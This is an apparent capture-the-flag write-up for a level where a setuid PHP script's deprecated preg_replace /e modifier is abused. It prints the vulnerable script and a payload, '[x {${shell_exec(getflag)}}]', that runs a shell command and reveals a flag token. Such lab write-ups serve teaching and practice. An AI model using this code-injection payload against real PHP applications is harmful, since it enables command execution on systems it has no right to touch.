```sh
$> ls -l ~
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

`level06.php:`

```php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m); // replace dots with x
	$m = preg_replace("/@/", " y", $m);   // replace @ with y
	return $m;
}

function x($y, $z) {
	$a = file_get_contents($y);

	// '/e' is deprecated in php > 5
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // replace [x ...] with y(...)
	$a = preg_replace("/\[/", "(", $a);                     // replace [ with (
	$a = preg_replace("/\]/", ")", $a);                     // replace ] with )
	return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
```

We can exploit the fact that we can execute a command thanks to the deprecated `eval()` function in the regex.

```sh
$> echo '[x {${shell_exec(getflag)}}]' > /tmp/tst; ./level06 /tmp/tst nth
[...]
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
````
